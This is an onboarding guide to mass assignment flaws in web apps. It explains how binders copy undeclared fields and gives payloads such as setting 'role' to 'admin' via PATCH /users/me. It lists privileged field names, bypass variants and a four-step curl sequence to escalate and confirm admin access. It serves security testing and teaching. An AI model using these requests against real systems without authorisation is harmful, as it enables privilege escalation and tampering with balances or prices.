# Onboarding deep — mass assignment, the full picture for a first reader

## The story

A web app has a `users` table with more columns than the registration
form shows: `username`, `password`, `email`, `role`, `is_admin`,
`balance`, `verified`, `plan`. The form fills three fields; the
framework's binder fills whatever the request contains. If the binder
copies `role:"admin"` from your request into the `role` column — and
some code checks `if user.role == "admin"` — you've just granted
yourself admin.

## The mental model

```
what the form sends     :  {username, password, email}
what the model has      :  {username, password, email, role,
                            is_admin, balance, verified, plan, ...}
what the binder copies  :  whatever you send    ← the bug
```

The attack: send a field the form never declares — `{"username":"x",
"password":"p","role":"admin"}` — and see if it lands on your record.

## The two-step confirm

```
1. write:   PATCH /users/me {"role":"admin"}
2. read:    GET /api/me  →  does it show "role":"admin"?
3. decide:  GET /admin   →  does it open?
```

The field must STORE (read-back shows it) AND CHANGE A DECISION (the
gate opens). A stored-but-useless field is a null result.

## Why the update endpoint first

`POST /register` is the tightest binder — the form declares exactly
what to accept. `PATCH /users/me` is the update — and updates are
"meant to be editable," so the allowlist is wider (or absent). The
profile binder is usually the live hole.

## The field names to know

```
privilege:    role, is_admin, isAdmin, is_staff, permissions, groups
state:        verified, is_active, approved, activated
economics:    balance, credits, price, discount, total
entitlement:  plan, tier, subscription, features
```

These are the high-frequency set — most models carry at least one.

## The falsifier — when to stop

- `400`/`422` "unknown property" → the JSON schema rejects extras;
  try `role=admin` form-encoded (different parser);
- `200` + field absent on read-back → the binder dropped it
  (allowlist); try `{"profile":{"role":..}}` nested;
- `200` + field stored + gate still `403` → the gate reads a different
  field (`is_staff`?); the bound field is inert — null result;
- `GET` shows NO privileged fields anywhere → the model has nothing
  worth binding — the class is dead.

## The class rule

A stored field that never changes a decision is NOT a finding. The
bug is the CHANGED DECISION — the admin route opening, the total
going to zero, the verify gate flipping — not the stored bytes.

## The first run

```bash
# 1. see what fields the model has
curl -b "$JAR" "$BASE/api/me" | jq 'keys'

# 2. try to write one
curl -X PATCH "$BASE/users/me" -H 'Content-Type: application/json' \
  -b "$JAR" -d '{"role":"admin"}'

# 3. read it back
curl -b "$JAR" "$BASE/api/me"     # "role":"admin"?

# 4. exercise it
curl -b "$JAR" "$BASE/admin"      # 200 = decision changed
```

## What this class is NOT

- `{"author_id":9}` accessing another's record → `web-idor`;
- `{"__proto__":{...}}` polluting all objects → `web-prototype-pollution`;
- `{"$set":{...}}` operator injection → `web-nosqli`;
- calling `/step3` to skip a workflow → `web-logic-flaw`.

The boundary: this class is the BOUND FIELD on YOUR object.
